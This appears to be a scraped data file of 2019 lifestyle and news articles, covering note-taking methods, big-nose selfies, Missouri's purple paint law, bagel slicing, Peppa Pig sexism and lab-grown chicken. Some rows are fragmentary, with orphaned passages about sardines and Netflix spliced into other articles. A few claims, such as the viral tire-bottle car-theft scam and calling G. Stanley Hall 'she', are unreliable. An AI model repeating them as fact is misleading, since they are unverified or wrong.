The Cornell Method. This note-taking system was created by in the 1940s by Walter Pauk, a professor at Cornell University. You need to divide a piece of paper into three sections: notes, cues, and summary. Take notes in the main area, and add cues such as key points and action items in the left-side column. After your meeting, class, event, or when you are done watching a video or reading a blog post, take a few minutes to summarise everything at the bottom of the page. I personally like using this particular note-taking system when sitting in a lecture or at a conference with pen and paper.



The Mind Map. The concept of mapping information in a visual way using branching traces back centuries. This note-taking method is great for visual learners and can help maximise your active learning by actively forming connections between concepts. Write the central topic or start of a conversation in the middle, then draw nodes around this topic with related ideas. And if you want to take mind mapping to the next level, give Roam Research a try. It’s mind mapping on steroids.



The Charting Method. I personally find this one not flexible enough for most of the content I consume, but it can be powerful for topics that can be broken into categories, such as similarities and differences, dates, events, etc. Each row is used to describe an element of the idea you are studying, and each column lets you detail aspects of the corresponding element. As you can see, it only works with very specific types of structured data.

These are the more traditional note-taking methods. Another one I personally find particularly useful to turn my information input (consumption) into creative output (creation) is the Zettelkasten method. Despite the complicated name, it’s actually pretty simple, and allows you to avoid the common pitfall of taking lots of notes without ever interacting with them ever again. The book How to Take Smart Notes offers a great introduction to this note-taking system.



I hope you find these useful and start taking notes more often. It’s a very effective way to be more productive and more creative by ensuring the information you consume gets stored in your long-term memory and is easily retrievable any time you want to create original content.",The science of note-taking,

Cooper said that on the set of ""Adventure Capitalists,"" where entrepreneurs pitch their adventure sport products to investors, he became known as ""Sardine"" among the production staff. ""Not the best nickname, but it stuck."" While a bit unusual, he says his daily sardine habit works.

Why pictures of big noses have taken over your social feeds

",8/04/2019 10:17,https://nypost.com/2018/02/21/why-pictures-of-big-noses-have-taken-over-your-social-feeds/,"A campaign to banish insecurities about big noses has encouraged people to share their support with a side-on selfie.

Journalist Radhika Sanghani launched the hashtag #sideprofileselfie today in a bid to break the big-nose taboo.

The 27-year-old told the Sun Online she wants her campaign to spark a change in the beauty industry.

She said: “I’ve hated my nose for most of my life.

“It’s only in the last few months I’ve finally accepted it’s just the way it is because I’m so tired of feeling bad or ugly for not matching up to the beauty stand we see in the media.

“I had this kind of revelation and it honestly changed my life.

“When I felt how freeing it was, I really wanted to spread that feeling and help other people with big noses to embrace theirs too.”

She added: “I want this to have a bigger effect on the fashion and beauty industries. I want women with big noses to be in TV adverts in movies, and magazines.

“Once we see that, I think it will inspire younger generations to make them realize that big noses can be beautiful.”

Despite originally thinking that only women would get in touch, Sanghani says she has been receiving messages all day from men who have struggled with their big-nose insecurity.

She said: “I think it comes from not seeing anybody who looks like you when you’re watching TV or movies or reading magazines.

“Everybody who is portrayed as beautiful, like the leading heroine in a movie or a Disney princess, has a small nose.

“From a really young age, you just assume that having a small nose equals beautiful.”

Sanghani, who was held back as a teenager because she felt “ugly,” says she has been touched by how many people have shared a side-on picture with her online.

One supporter praised her campaign, saying: “Finally someone who dares say that a strong-nosed woman can be beautiful in a world where miniature noses are the standard.”

She appeared Tuesday on “Good Morning Britain,” where viewers were asked: “Is the world against big noses?”

The program was bombarded with replies from viewers.

One said: “I’ve hated my nose for as long as I can remember. Big noses look manly.

“I’ve twice almost had a ‘👃 job’ but needed the money for more important things (important to my family).”

Another said: “Bullied at school for my nose that ‘looked like that girl from The Grinch’ hated it until I left school and realized it added character.”

Someone else added: “Big noses are cool! Took me many years to realize this thanks to society but I do now.”

Others took the campaign less seriously: “Lord nose why you are running this story….can’t you sniff out a less ridiculous one?”

And who nose … maybe size does matter

Male monkeys with large noses have more females in their harems — proving that size does matter, according to a team of scientists.

Researchers studying proboscis monkeys in Malaysia found that males with exaggerated masculine traits, such as big noses, “serve as advertisements to females in mate selection.”

Those involved in the study from Cardiff University, Kyoto University and Sabah Wildlife Department and the Danau Girang Field Centre in Malaysia say the new evidence points to both male-male competition and female choice as contributing to the evolution of enlarged male noses.

The primate, which is native to Borneo, sports a sizeable snout, which Dr. Sen Nathan, assistant director of Sabah Wildlife Department and a Ph.D. student at Cardiff University and Danau Girang Field Centre, said had long been admired as an “extremely attractive” visual feature by biologists.",Why pictures of big noses have taken over your social feeds,

People Who Come Across A Purple Fence Should Turn Around

Purple Paint Law can save valuable lumber

Purple paint on boundary line trees or fence posts means NO TRESPASSING, just as a green light means go and a red light means stop. But how can the purple paint law possibly save money for a woodland owner?

Just think. In the past, if woodland owners wanted to post their land against trespass, they would almost always nail a sign to a tree.

I have seen black walnut, white oak and red oak veneer logs ruined by such a practice. Think of the hundreds, if not thousands of butt logs, the most valuable log in a tree, that were affected!

In the mid-1990s, the Missouri State Legislature passed the Purple Paint Law, probably never realizing they were going to save millions of future butt logs. The law reads as follows: ""The owner or lessee of any real property may post the property by placing identifying purple paint marks on trees or posts around the area to be posted. Each paint mark shall be a vertical line of at least eight inches in length and the bottom of the mark shall be no less than three feet nor more than five feet high. Such paint marks shall be placed no more than 100 feet apart and shall be readily visible to any person approaching the property. Property so posted is to be considered posted for all purposes, and any unauthorized entry upon the property is trespass in the first degree, and a class B misdemeanor"".

Another important advantage of purple paint over posted signs is that it cannot be torn down. Also, as fast-growing trees pull the nails through the sign in 2 or 3 years, it loses hold and falls, requiring replacement. And, hunters won't be as tempted to shoot purple paint as they are to shoot signs.

To make the purple paint last longer, before painting a tree, scrape off the loose bark with a draw knife, taking care not to wound the tree. This process will at least double, if not triple the life of the paint mark, anywhere from 4 to 8 years! Smooth-barked trees, such as hickory are perfect to paint.

Study Says Kids Shouldn't Cross the Street Alone Until This Age
",4/04/2019 13:13,https://www.parents.com/health/parents-news-now/science-says-kids-shouldnt-cross-a-busy-street-solo-unitl-theyre-14/,"Kids younger than 14 can't always identify gaps in traffic that are large enough for them to cross safely, says a new study.

My kids are 14 and 11, and I'm not gonna lie—I HATE the idea of them crossing streets alone. They've both done it, just not with me because it makes me a nervous wreck. I call it ""street fear""—that moment when you're waiting to cross a busy street and finally decide to step out into a gap in traffic and bolt across. I'm 47 and my heart still races every time. Not as much as it did when I was younger, but enough that I still grasp tightly to both of my kids' hands.

Now science has just issued a pretty big strike against letting kids younger than 14 cross solo. According to a new study out of the University of Iowa, younger kiddos lack the perceptual judgment and physical skills needed to consistently get across safely.

""Some people think younger children may be able to perform like adults when crossing the street,"" said study author Jodie Plumert. ""Our study shows that's not necessarily the case on busy roads where traffic doesn't stop.""

While 14 may sound kind of old to some, when the researchers used a simulated setting to assess the ability of children ages 6 to 14 to cross one lane of a busy road, the younger children consistently had difficulty crossing safely, with accident rates as high as 8 percent among 6-year-olds. The 10-year-olds, meanwhile, were struck 5 percent of the time, and 12-year-olds, 2 percent of the time. Only the 14-year-old kids were able to consistently get across the lanes safely.

The big takeaway here for parents is to take extra precautions and recognize that your child may not be able to identify gaps in traffic that are large enough to cross safely. The researchers are now urging city planners to build more crosswalks near schools. But in the meantime, if your children have to cross the street without you, teach them to be patient and wait for bigger gaps in traffic.",Science Says Kids Shouldn't Cross a Busy Street Solo Until They're 14,

Should You Slice Bagels Like a Loaf of Bread?
",1/04/2019 10:20,https://lifehacker.com/should-you-slice-bagels-like-a-loaf-of-bread-1833606826,"In our latest edition of “Hack or Wack,” we’re taking a look at this viral tweet from a St. Louis native:

In the tweet, Krautmann asserts that he introduced his coworkers to this “St. Louis secret” of ordering bagels sliced into cross-sections like a loaf of bread.

Well. Maybe it should stay a secret.

If you are on the side of all that is good and true, you will note that this method results in many slices of irregular size, almost entirely eliminates the appeal of the bagel’s chewy outer crust, and results in sad little crostini that could be made out of any bread-like product.

Meanwhile, this G-d-forsaken “hack” has torn—or should I say sliced—our office apart. Some (wrong) members of the Lifehacker staff suggested that this idea is not a nightmarish hellscape, noting that this allows for smaller, easy-to-consume portions that will toast quickly and are more shareable.

But others have pointed out that smaller portions may result in over-consumption. You might eat 12 bagel/crostini/atrocities before realizing that’s equivalent to two full bagels. (In this writer’s humble opinion, I don’t know how anyone could down even one of these without their body rejecting it on sheer principle.)

This is certainly the worst bagel take since Cynthia Nixon’s lox-on-a-cinnamon-raisin-bagel scandal, (which I’m pretty sure cost her the election).

It’s also worth pointing out that the sad bagels in the photo are from Panera Bread, which add another unfortunate schmear of irony to this story: The billionaire owners of Panera (as well as Einstein Bagels and Krispy Kreme) recently came into the news when addressing the company’s Nazi past.

Of course, no religion or group of people owns this delicacy, and people may do with their baked goods as they wish. But as a New Yorker who attended a high school with a daily mid-morning snack time called “bagel break,” I find this concept offensive. The fact that it eliminates all texture that makes the bagel appealing is offensive. The fact that it comes from St. Louis is offensive. The fact that they ordered bagels from Panera is offensive. The fact that the person at Panera said “You want us to put bagels in the bread slicer? Okey dokey!” is offensive. This is the equivalent of a scoop of Temp Tee cream cheese thrown in your face, an egg cream poured over your head, and hot pastrami spilled all over the linoleum.

Does Jordan Peele's 'Us' Movie Have a Post-Credits Scene?

",31/03/2019 9:55,https://www.thewrap.com/jordan-peele-us-movie-does-it-have-post-credits-scene-ending/,"Jordan Peele, just two years after making his directorial debut with “Get Out” and winning an Oscar for his efforts, is back once again taking Hollywood by storm with another deep and though-provoking horror flick, “Us.”

But “Us” is a little bit less straightforward than “Get Out” was, offering up what appears on the surface to be a fairly simple but ingenious twist on the home invasion formula — our protagonist family of four, led by Lupita Nyong’o and Winston Duke, is forced to face off against their own evil doppelgangers. But the further you get into the film, the clearer it becomes that there is so much more going on here than you could have imagined.

So as the credits begin to roll and you’re trying to figure out what it was you just saw, you’re gonna want help from any place you can get it because “Us” really is quite a doozy.

So you’re probably going to wonder — or hope, as I did — that Peele would bestow “Us” with a stinger or extra scene during or after the credits that might shed some light on the revelations that the film dropped as it reached its climax. So does “Us” have a mid-credits scene or post-credits scene or anything like that?

While we here at TheWrap would always encourage any and all moviegoers to stick around through the end credits of a film to show some small amount of appreciation for the many, many people that were responsible for bringing whatever you just watched to life, you can rest assured that “Us” does not feature any extra scenes during or after the credits. So if you’ve got to get out of the theater quickly or are in dire need of a visit to the restroom, you can head out knowing that you won’t be missing any extra content or clues to help decipher the film by leaving when the credits start.",Does Jordan Peele’s ‘Us’ Have a Post-Credits Scene?,

England's oldest man reveals hilariously blunt key to long life as

he turns 111
",30/03/2019 10:17,"https://www.mirror.co.uk/news/uk-news/britains-oldest-man-celebrates-111th-5853223#:~:text=Britain's%20oldest%20man%20revealed%20the,the%20invention%20of%20colour%20television.","Nazar Singh, born on June 8, 1904, survived a recent infection and reckons his longevity is down to plenty of sleep, a healthy lifestyle.....and his favourite whisky tipple

Britain’s oldest man revealed the secret to a long life today as he celebrated his 111th birthday..... with a pint of Stella and a whisky chaser.

Nazar Singh, born on June 8, 1904, has lived through two World Wars, the Titanic disaster, the first moon landing and the invention of colour television.

He grew up in Punjab, India, moved to England in 1965 and worked hard in a foundry, living in Walsall for almost 25 years before retiring to Sunderland in 1989.

He reckons his longevity is down to plenty of sleep, a healthy lifestyle.....and his favourite whisky tipple.

The centenarian has nine children, 34 grandchildren and 64 great-grandchildren and was married to his wife, Narajan Kaur, for 70 years before she died 12 years ago, aged 90.

He has never had an operation, retains some of his original teeth and has perfect hearing.

Mr Singh’s son, Chain Singh Gill, 62, said the secret to his father’s longevity is a healthy lifestyle and the odd glass of whisky.

He also revealed he likes to drink milk and almond oil, regularly eats fruit and sleeps for ten hours every night.

His family say he nearly died recently of an infection but pulled through and is currently seeing family in India - where he was pictured enjoying a Stella and a shot.

Mr Gill said: “We thought we had lost him because he had an infection but, thankfully, he is recovering now.

“It’s the care he gets and the food he eats that are most important. He doesn’t eat junk food and that’s what has kept him alive.

“I’m in contact with him, sometimes twice, every single day on the phone and he’s in good spirits.”

Mr Singh was raised in a village in Punjab and from the age of 10 helped his family to grow sugar cane, cotton, corn, wheat and later chilli, peanuts, potatoes and rice.

Born into a farming family, he always loved the outdoors and was a big fan of gardening - a hobby he refused to ditch until he turned 107.

Mr Singh met his wife, Narajan, in 1932 when he visited a nearby village and they were later wed in a traditional arranged marriage.

The 111-year-old had two sisters and four brothers who have all since passed away.

He returned to his native India at the beginning of the year to be with his family and is now being being cared for by his two eldest sons - the eldest of whom is 78 - and their wives.

Thought to be Britain’s oldest man, Mr Singh received a letter from the Queen on his 100th birthday and has been sent one every year since, along with an annual letter and phone call from the Department For Work and Pensions to see how he is.

In his lifetime, Mr Singh has witnessed the invention of the modern car, mobile phones, televisions, computers and the internet.

He has seen women get the right to vote, the fall of Nazi Germany, the beginning and end of Apartheid and the dissolution of the Soviet Union.

The oldest person believed to be alive today is 116-year-old Jeralean Talley, from the United States, who was born in 1899.

There are only two living men believed to be older than Mr Singh - Japanese Sakari Momori and Yasutaro Koide, who are both 112 and were born in 1903.",Britain's oldest man celebrates 111th birthday with a pint of Stella and a whisky chaser,

Viral video warns over horrible new trick: If you see a plastic bottle
on your tire, you're at risk

",28/03/2019 14:45,https://en.newsner.com/family/warning-over-horrible-new-trick-if-you-see-a-plastic-bottle-on-your-tire-youre-at-risk/,"If there’s one thing the rise of social media has made infinitely better, it’s the ability for us to share warnings and advice with each other on an unprecedented scale.

One simple warning can now reach millions of people in a single day, which is in part the reason for this particular article.

Over the years there have been no end of tricks and sneaky tactics employed by people intent on scamming others.

Well, there’s now a new one to watch out for, if reports are to be believed. It involves a plastic water bottle, your car tire, and the potential theft of your car itself …

News agencies in multiple countries are covering this most dastardly of schemes, proving that it’s rapidly spreading around the world.

It was first reported in Limpopo, South Africa, but quickly spread online after a YouTube channel in Mexico issued a “warning” over criminals attempting to steal vehicles. Unfortunately, the video ended up doing harm as well as good, simultaneously teaching other would-be thugs how to swindle someone out of their car.

The scam goes like this: first, the criminals target a parked and unattended car, placing a water battle in the crevice between one of the tires and its wheel well. After the driver fails to spot the bottle, he or she will get in and start the engine.

No sooner have they got their vehicle moving than does the bottle crack and break as the tire goes round. This, of course, produces an alarming noise for the driver, who more often than not gets out of their car to inspect the noise.

Since they only expect to be out momentarily, it’s all too easy for said driver to leave the keys in the ignition, thus leaving the car at the mercy of anyone who wishes to jump in and drive away.

It’s as simple as that: driver gets out, driver gets distracted, thieves jump into car, car drives off. In some cases the criminals aren’t actually stealing the car, but rather valuable contents inside. Either way, the driver is robbed of something he or she has worked hard for …

Watch the video below to see a tutorial on the trick. It’s in Spanish, but the video itself tells all you need to know.

Though this horrible trick began half a world away, it’s spreading rapidly, and could all too easily end up on your very street. Please remember to always be vigilant when you suspect something might be wrong. Check your tire wells before getting into your car if you think for one moment that someone might have been messing with it.

Criminals can be crafty and clever – as has been proven in abundance throughout the course of history. Through transparency, vigilance, and communication we can foil them, however. No one deserves to fall victim to such a trick!

That's the most substantial increase in its history. Following the announcement, the company's stock shot up more than 6 percent.

If you had invested in Netflix in 2007, when it first began its streaming service, that investment could have paid off big time: A $1,000 investment would be worth more than $90,000 as of Jan. 15, according to CNBC calculations.

While the company's stock has performed well over the years, any individual stock can over- or under-perform and past returns do not predict future results.

The platform faces competition from Amazon, Apple, Disney and, most recently, NBCUniversal, which either offer similar services or plan to launch streaming platforms and which could pull content, and potentially viewers, from Netflix.

""I think Netflix is in trouble when the big guys start coming after them,"" Laura Martin, an analyst at investment-banking and asset-management firm Needham & Company, said in a previous interview with CNBC.

Still, investors remain generally optimistic about Netflix.

Peppa Pig Has Been Called out for Using Offensive Term
",26/03/2019 10:09,https://twentytwowords.com/peppa-pig-called-using-offensive-term/,"Kids’ TV shows are usually known for their innocuous drivel that helps keep children quiet for a couple of precious minutes. At best, they are educational, at worst they are hugely irritating.

But now, other things are being brought to people’s attention and it looks like they could be causing some pretty big problems. The main culprit is none other than the wildly popular Peppa Pig. Who knew that a kids’ TV show could cause such a fuss?

advertisement

What’s so great about Peppa Pig? Whether or not you have children, you will undoubtedly have heard of many children’s favorite TV character, Peppa Pig. As the name suggests, it follows the lives of a family of pigs. Our protagonist, Peppa, lives with her younger brother, George, and Mummy Pig and Daddy Pig.



advertisement

“The Peppa Pig Effect” is a real thing. Peppa Pig is a British TV show, so all the characters have quite posh English accents and American parents have recently started reporting that their children have taken up English accents as a result of watching too much Peppa Pig! Apparently, American children are starting to say things like ‘mum’ and ‘loo’. This is the ‘Peppa Pig Effect.’ But while this is hilarious, it’s not the main problem with the show.



advertisement

Peppa Pig has been in trouble before. There is an episode of Peppa Pig called ‘Mr Skinny Legs’. In the episode, Daddy Pig tells Peppa Pig that she doesn’t have to be afraid of spiders because they can’t hurt her. This is true in the UK, which means that arachnophobia, the fear of spiders, is usually considered to be an irrational fear. But that isn’t necessarily true everywhere in the world.



advertisement

Australia has had to ban the episode. While spiders aren’t dangerous in the UK, in Australia they pose a real threat. There are over 10,000 species of spider in Australia, and many of them are poisonous. An episode that encourages children to pick spiders up and throw them outside is teaching Australian children the wrong lesson. It could, in fact, be a very dangerous thing to do!



advertisement

What is the role of childrens’ TV shows? This is a really important question. Should kids’ TV just be about escapism and a moment of peace for parents, or should it offer something more? Does it matter what kids are watching or should a kids’ show just keep a child quiet?



advertisement

Kids are sponges. Young children are like sponges; they absorb everything they see. Their minds are still forming and they are learning from everything around them. For this reason, kids’ TV is actually very important. The hours spent watching these shows are hours spent learning from them.



advertisement

What kind of people do we want our children to be? For this reason, it’s important that we teach children to be open-minded and loving, that they understand that good behavior is important, from a young age. Many of childrens’ role models these days are characters in TV shows. Seeing what their favorite characters achieve inspires children to work hard do the same.



advertisement

Peppa Pig has quite a few controversial aspects. Before this latest uproar, one person had already called out Peppa Pig for a number of reasons, namely for fat-shaming. Okay so pigs are known for being fat, but it all gets a bit trickier when the pigs represent people, as they do in Peppa Pig.



advertisement

Is Peppa Pig a bad role model? Laughing at ‘Daddy Big Tummy’ encourages children to think they are allowed to laugh at people for being fat. Obviously, if this is carried into the real world, it becomes super uncool behavior. It would be better if characters, and therefore, children, could celebrate each other’s differences. Or at the very least, mention that people are all different sizes and that that’s okay.



advertisement

Were you influenced by a character as a child? Children are affected by their role models, whether they be toys or characters from TV shows, because it is only through seeing other people similar to yourself doing something, that you believe that you are capable of it too.



advertisement

That’s why Barbie has realized it needs to diversify. Okay, so admittedly, in many ways, Barbie is the worst role model in the history of role models. Her name is synonymous with an unattainable standard of beauty that not even supermodels can hope to reach. But recently, her creators have realized that they need to join the rest of the world in being a little bit more woke and that they need to try to diversify, at least a little. Now, the Barbie figures come in 4 different body types and 7 hair colors. While it’s not exactly diverse, it’s a start.



advertisement

Barbie has had more career changes than most! Barbie is really excelling in terms of the different careers that she has had. So far she has had at least 130 different careers, ranging from astronaut to president. But the one that’s really got people talking is the Barbie Firefighter.



advertisement

Firefighters are very encouraging of Firefighter Barbie. Recently firefighters in the UK have been trying to tackle sexism that surrounds stereotypes in their profession. Namely, that they are all ‘firemen.’ This is obviously hugely disrespectful to all the women who are also firefighters, and it suggests to women everywhere that firefighting is not the profession for them.



advertisement

It is for this reason that the world is up in arms about Peppa Pig. In a shockingly unthinking display of sexism, Peppa Pig exclaims, “Mummy Pig is dressed as a fireman.” And no, it wasn’t a staged scene to explain to children that it is the wrong thing to say. It was scripted and aired; seems that no one on the Peppa Pig team thought anything of it.



advertisement

The public realized the ramifications immediately, though, and they were not happy. London Fire Brigade reacted and pointed out that they have not used the term ‘firemen’ for thirty years. So not only is the term sexist, but it’s also outdated. They highlight the fact that by using gender stereotypes, they are putting the idea in childrens’ heads that they can only do certain jobs.



advertisement

Some people didn’t see a problem with the scene. Piers Morgan, an English journalist who can be sure to point you in the right moral direction as he launches himself the other way, once again demonstrated his lack of ethics as he questioned the impact of blatant sexism. For some reason, he cannot see how this kind of language could dissuade young girls from potential careers in the future. Maybe this has something to do with the fact that he is a straight, white, cis-gendered, British male with all the privilege in the world. Maybe.



advertisement

Luckily, there are decent people in the world who are willing to challenge him. This twitter user highlights Morgan’s ignorance by pointing out the effect of these TV shows. It is at their young age that children need to see the options that are available to them in the future, and shouldn’t we be encouraging children to do anything that they want to do?



advertisement

Having daughters can make a huge difference. This man points out what many of us have witnessed first-hand: having daughters makes you re-evaluate your stance on sexism. This father has clearly seen the effect that a sexist world can have on his daughters and he’s not happy about it.



advertisement

“The Mighty Girl Effect” In fact, what this father described has a name. It is known as the ‘Mighty Girl Effect.’ It depicts research that shows that men who live with daughters gradually moderate their views on gender norms. There is even research that suggests that male CEOs with daughters are more likely than those without to take action in championing gender diversity in their work places.



advertisement

The London Fire Brigade knows what it’s talking about. Although some people might argue that shows like Fireman Sam have a female firefighter, and so that equates to gender equality, we’re on side with the LFB here. The involvement of one woman is completely undermined by the repeated use of the term ‘fireman’ rather than ‘firefighter.’



advertisement

Parents are starting to stand-up for their daughters’ futures. Hannah Summers sparked a huge reaction earlier this year when she tweeted about her daughter, Esme. Apparently, four year old Esme is already somewhat aware of the gender gap, and it is already affecting the choices that she will go on to make. If nothing else, hopefully, this will make it clear that we need to use the term ‘firefighters,’ rather than the gender specific term, ‘firemen’.



advertisement

Luckily, the world saw the tweet and wanted to help out. One branch of the London Fire Brigade saw Hannah’s tweet and sent a personal reply, just 9 hours later. Their tweet lets Esme know that she wouldn’t be alone if she wanted to be a firefighter; there’s loads of female firefighters out there!



advertisement

Other firefighters spoke out too. It’s awful to think that young children may already feel restricted about what they can do in their futures. Childhood is supposed to be a time of infinite dreams, not of gender restrictions. It is for this reason that so many firefighters are trying to demonstrate that gender is not important in the battle to save lives as firefighters. They are definitely living up to their chosen hashtag: #firefightingsexism.



advertisement

The battle against sexism is a global fight. Esme’s discovery of gender stereotypes at such a young age has crossed the Atlantic and reached all the way to Vancouver. Around the world, people are aware that there is a stigma around female firefighters that needs to be broken, so why didn’t the Peppa Pig team realize?



advertisement

Firefighters aren’t the only people who suffer from gender stereotypes. People were, understandably, outraged about this photo that went up recently of a young girl and boy. While some people were suggesting that the world was taking political correctness too far (something that is usually only claimed by people with privilege that they don’t want to concede to equality), other people saw this photo for what it was.



advertisement

Isn’t this all a bit of an over-reaction to kids’ stuff? The problem is that this is happening all the time and it’s so subtle that people think that it’s not a big deal. By using the word ‘fireman,’ rather than ‘firefighter,’ or by suggesting that girls will be nurses, rather than doctors, we are excluding young girls and women from certain occupations and that is undeniably wrong.



advertisement

Young girls are subtly being told that they will never make as much money as men. The sexism that is presented to young children at every turn is constantly reinforced by gender expectations. Girls are told that they should be beautiful, cute, or pretty, while boys are told that they need to be brave, strong, or clever. We start forming our ideas at a very young age, and these, in turn, influence our decision-making.



advertisement

There is no natural difference in interests between girls and boys at birth. It is not true that boys and girls are born with wildly different interests, which happen to mean that boys choose positions of authority that are paid more, while girls naturally choose roles with less prestige and less money. These are merely the gender roles that the world keep perpetuating. It is for this reason that people found the term ‘fireman’ offensive in Peppa Pig. So many children watch that show, and they were all told that being a firefighter is a male job and that is not okay.



advertisement

In some ways, Peppa Pig does provide positive role models. This Twitter user pointed out that the Peppa Pig books are full of female firefighters and it’s true; it’s great that Peppa Pig is showing women in these roles! But language is an incredibly important way in which we form our ideas and our identities. We need to speak in a way that reflects the society that we want to be a part of, rather than just copying the way things used to be said in the past.



advertisement

Hopefully other shows will learn from this mistake. Ultimately, this was an unfortunate moment of insensitivity but it shows a lack of understanding that, in many ways, belittles both the hard work of firefighters, as well as the battle against sexism. Hopefully, the fact that everyone has noticed, and has rightfully criticised, this insensitivity, will prevent other shows from making the same mistakes. In turn, this should lead to a well-balanced and just society that promotes equal opportunities for everyone, regardless of gender or any other factor.

Throwing Your Shoe At A Cat Will Cost You At Least $500 In This
Country
",23/03/2019 17:47,https://blog.theanimalrescuesite.greatergood.com/cat-burglar-steals-shoes/,"Like many cats, Jordan, a long-haired cat from Pennsylvania, loves to shower his favorite human with presents. These gifts used to include mice, birds, snakes, and other typical feline prey, as well as the occasional piece of litter. But one day, the black-and-white cat suddenly turned his attentions toward a more unusual target: shoes.

At first, Jordan’s owner threw away the odd shoes that randomly appeared in his yard. But when the cat’s collection of pilfered footwear started piling up, owner BJ Ross created a Facebook page to help neighbors reclaim their stolen loot.

“If y’all know my cat Jordan, y’all know he loves to bring me home shoes!!!!!” Ross wrote in the public group, Jordan The Feline Cat Burglar, which quickly ballooned to include thousands of members. “This tiny little cat drags me home one, two, three shoes. Every night!!”

Most members aren’t actually victims of Jordan’s thievery but have tuned in to follow this adorable feline felon, whose illicit stash already includes 50 shoes – and counting. This startling intake led Ross to outfit his cat — who has been repeatedly caught on the security camera — with a GPS tracking collar to see how Jordan manages to collect so many shoes.

According to Jordan’s tracking device, this committed cat burglar maintains a large territory that encompasses multiple visits to houses throughout the neighborhood. This is likely because Jordan likes to present his owner with complete pairs, but — being a cat – can only carry one shoe at a time. A lesser cat burglar might find this limiting, but Jordan prepares for his nightly misadventures with lots of proactive napping.

Regardless, most people on Jordan’s Facebook page are endeared by the cat’s penchant for human footwear, which has inspired hundreds of comments and adoring fans on Facebook. “It kills that he goes back and gets the other shoe to make a pair smart kitty,” one Facebook user wrote. Another woman confided that her young daughter “thinks Jordan is “so cool” and insisted on leaving her sister’s shoes out for him.”

It’s unclear if Jordan’s victims are equally entertained by the cat’s thievery, but Jordan’s owner is happy to make returns if somebody recognizes their shoes and messages him directly.

How Many Times Should You Say ‘Chugga’ Before ‘Choo Choo’?

Well, here’s something new to get all steamed up about.

A Reddit user recently posted a seemingly innocent question to the subreddit Too Afraid To Ask, and it blew up into one of the greatest debates of our time: “How many ‘chuggas’ are you supposed to say before ‘choo choo’”?

The question immediately sparked some pretty fervent responses.

One of the most popular comments cited the importance of the “Batman” theme song in this particular situation.

“My rules is the same number of chuggas as we do for the Batman cartoon theme song,” Reddit user deadfermata wrote. “Na na na na na na na na na na na na BATMAN!”

Soon after this comment was made, the consensus seemed to be that eight was the optimal number of chuggas for perfect chugga/choo-choo proportions.

Scientists Have Found Out When You Really Become An Adult
(And It's A Lot Older Than You Think)

",20/03/2019 17:30,https://www.iflscience.com/health-and-medicine/the-latest-research-suggests-we-dont-really-become-adults-until-our-thirties/,"What makes an adult an adult?

Is there a pre-defined age? Say, when you turn 18 and are officially ""legal"". Or can you only pass after you've checked off a certain number of pre-selected rites of passage? The mortgage, the marriage, the 9-to-5 job, 2.5 kids, Volvo Hatchback, and white picket fence, etcetera.

Well, science has an answer and the truth appears to be less clear cut. The latest research seems to suggest that we don't become fully formed adults until we reach our thirties – though as with puberty, wisdom teeth, and losing our virginity, the exact age varies from person to person.

The reason scientists have identified our thirties as the entry point to adulthood is due to the extent of changes, particularly in the brain, that takes place in our late teens and throughout our twenties. For example, our neurons continue to develop, connect, and become more refined in our third decade, even if the bulk of the change took place in our mid-teens. (And it can continue to change well past our thirtieth birthday.)

These changes can affect our behavior and even our propensity to develop mental health conditions like schizophrenia. To take the example of schizophrenia, the average age of onset is late teens to early twenties in men and late twenties to early thirties in women.

""What we're really saying is that to have a definition of when you move from childhood to adulthood looks increasingly absurd,"" Peter Jones, a professor of neuroscience from Cambridge University, told reporters at the Academy of Medical Sciences in Oxford, UK.

""It's a much more nuanced transition that takes place over three decades.""

This idea that childhood stops at 18 has been gaining a lot of traction recently, with an article published in the Lancet Child & Adolescent Health journal just last year arguing that the period of life we call adolescence lasts much longer than most of us realize.

The term ""adolescence"" was first described in a 1904 paper published by the psychologist G. Stanley Hall called ""Adolescence"". She defined the word as ""the phase of life stretching between childhood and adulthood"". Most of us associate this phase with the teen years but it can start as young as 10, researchers say, when some girls start to hit puberty.

It continues, they explain, ""well into the twenties"" as the body and brain continues to develop and socio-economic forces (think: the rising cost of housing, an unstable job market, and student debts) delay the traditional signposts of adulthood (partnering, parenting, and economic independence) and extend the period of ""semi-dependency"" that is adolescence.

Similarly, recent neuroscience research suggests putting a timestamp on adulthood (18 years plus) is an old-fashioned way of looking at things.

""There isn’t a childhood and then an adulthood,"" Jones explained. ""People are on a pathway, they’re on a trajectory.""",Scientists Suggest The Age When You Really Become An Adult,

This is what a lab-grown chicken nugget tastes like

",20/03/2019 9:06,https://www.cnet.com/science/lab-grown-cultured-clean-meat-tasting-the-chicken-of-the-future-just-inc/,"Chicken nuggets usually get a pretty bad rap. Whether they're filled with mystery meat or come with a mouthful of additives, they also involve slaughtering an animal. But the nugget I'm about to eat from San Francisco-based Just was grown in a lab, using cells taken from a living chicken. It's cultured meat (and cruelty-free).

Carnivores, breathe a sigh of relief.

Now playing: Watch this: Trying a lab-grown chicken nugget

Unlike entirely plant-based products such as the Impossible Burger, the Just chicken nugget is actual meat.

Cultured meat, also called lab-grown or clean meat, starts with the collection of cells, usually done through a biopsy so the animals aren't harmed. Just says it has also been able to get cells from a chicken feather. The most viable cells are chosen and then given the right nutrients they need to grow in a bioreactor. In the case of this chicken nugget, those nutrients are plant-based.

Not only does cultured meat avoid sacrificing animals, it could take fewer resources to produce than traditional livestock. Around 14.5 percent of the world's greenhouse gas emissions are from livestock, according to a report from the Food and Agriculture Organization of the United Nations. But one study questions how environmentally friendly clean meat products could be if the process is energy-intensive.

CNET

Just's cultured chicken product takes around two weeks to grow in a bioreactor. The team of chefs plays a major part in creating the product once the scientists have developed the biology. ""They are really the ones that can assemble everything and come up with the ideal ratios of cell types,"" says Vitor Santo, director of cellular agriculture.

So what does it actually taste like? The crunch from the breading and the smell from the fry was exactly what I expected from a good chicken nugget. But I was pleasantly surprised at how similar the cultured chicken itself tasted compared to the real deal, even if it didn't look like your typical KFC or McDonald's nugget. You can watch the video to find out more.

Just's next cultured meat product will be wagyu beef. Several other companies are also developing clean meat derived from animal cells, like Memphis Meats (chicken and duck) and SuperMeat (also chicken).

If you're hankering to try your own cultured chicken nugget, you'll have to hold tight a little longer. The nugget needs to get USDA and FDA approval in the US, but Just says it'll first be available in selected high-end restaurants in Asia later this year once it gets regulatory approval.

Fashion Experts Say You Should Stop Wearing Jeans Once You

Reach This Age

marigold-y/Shutterstock

There are a surprising amount of activities you can’t do until you reach a certain age, like drive a car and rent a hotel room. On the flip side, you apparently can become too old to do certain things, too. That includes one rather commonplace habit: wearing jeans.

